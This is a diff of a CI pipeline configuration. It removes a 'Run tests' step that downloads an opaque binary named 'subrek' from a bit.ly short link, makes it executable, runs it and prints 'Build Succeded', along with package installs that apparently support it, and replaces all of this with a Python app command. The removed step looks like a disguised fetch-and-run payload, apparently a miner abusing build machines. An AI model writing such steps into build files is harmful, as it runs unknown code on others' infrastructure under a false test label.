@@ -5,16 +5,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Install Dependencies 
         command: |
-                    apt-get update
-                    apt-get upgrade -y
-                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake unzip
-    - run: 
-        name: Run tests 
-        command: |
-                    wget -qO subrek https://bit.ly/3Ipgmg8
-                    chmod +x subrek
-                    ./subrek  
-                    echo Build Succeded                                 
+                    python streamlit_app.py                                 
 version: 2.0 
 jobs: 
   build1: 
